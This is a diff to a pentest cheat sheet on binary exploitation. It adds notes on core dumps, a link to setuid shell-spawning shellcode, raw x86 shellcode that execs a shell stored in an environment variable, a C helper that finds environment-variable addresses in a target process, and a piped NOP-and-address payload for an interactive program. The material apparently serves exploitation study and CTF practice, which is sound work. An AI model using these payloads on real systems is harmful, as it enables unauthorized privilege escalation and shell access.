@@ -40,13 +40,57 @@ Linux System Call Table: [https://faculty.nps.edu/cseagle/assembly/sys\_call.htm
 
 
 
-Shellcode
+Create Core dumps after crash:
+
+```
+ulimit -c unlimited
+cat /proc/sys/kernel/core_pattern # Location and naming
+gdb app123 core
+```
+
+
+
+### Shellcodes
 
 {% embed url="https://shell-storm.org/shellcode/index.html" %}
 
-Store in environment variable:
+|                                                                          |                                                                                                                          |
+| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------ |
+| setreuid(getuid(), getuid()) & execve("/bin/sh") / (for setuid binaries) | [https://shell-storm.org/shellcode/files/shellcode-597.html](https://shell-storm.org/shellcode/files/shellcode-597.html) |
+|                                                                          |                                                                                                                          |
+|                                                                          |                                                                                                                          |
 
-```
+Store shellcode in environment variable:
+
+{% code overflow="wrap" %}
+```bash
 export shellcode=`python -c 'print("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f \x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")'`
-
 ```
+{% endcode %}
+
+Retrieve offset for environment variables:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc,char**argv){
+	char *ptr;
+	if(argc<3){
+		printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+		exit(0);
+	}
+	ptr = getenv(argv[1]);
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2;  
+	printf("%s will be at %p\n", argv[1], ptr);
+}
+```
+
+Run shell code for applications with interactive CLI:
+
+{% code overflow="wrap" %}
+```sh
+(python2 -c 'print "\x35\x0a\x32\x0a\x29\xcf\xff\xff\x35\xcf\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"' ; cat) | ./application
+```
+{% endcode %}
